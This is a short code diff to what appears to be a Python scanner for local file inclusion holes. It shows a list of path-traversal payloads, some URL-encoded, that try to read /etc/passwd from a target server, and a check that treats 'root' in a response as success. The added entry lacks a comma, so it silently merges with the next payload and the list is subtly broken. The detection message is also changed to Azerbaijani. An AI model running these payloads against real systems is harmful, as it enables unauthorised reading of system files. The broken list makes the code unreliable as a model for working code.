@@ -38,6 +38,7 @@ def main():
      
 
     payloads = [
+        "etc/passwd"
         "../../../../../../etc/passwd",
         "../../../../../../../..//etc/passwd",
         "..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd",
@@ -90,7 +91,7 @@ def main():
 
         if response.status_code == 200:
             if "root" in response.text:
-                print(f"LFI vulnerability detected with payload: {payload}")
+                print(f"LFI zəifliyi bu payload ilə təyin edildi: {payload}")
 
                 break
 
